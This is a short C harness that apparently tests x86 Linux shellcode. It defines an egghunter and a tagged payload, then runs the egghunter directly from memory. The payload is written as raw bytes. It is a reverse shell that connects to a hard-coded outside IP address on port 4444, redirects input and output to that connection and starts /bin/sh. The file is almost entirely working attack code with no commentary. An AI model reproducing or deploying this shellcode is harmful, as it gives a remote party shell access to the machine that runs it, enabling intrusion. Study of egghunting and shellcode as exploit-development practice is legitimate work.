#include<stdio.h>
#include<string.h>

unsigned char egghunter[] = \
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

unsigned char shellcode[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50\x6a\x66\x58\x31\xd2\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\x6a\x66\x58\x68\x5b\x8e\x5e\x46\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x87\xda\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x3f\x41\xcd\x80\xb0\x0b\x31\xd2\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

main()
{

	printf("Egghunter Length:  %d\n", strlen(egghunter));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
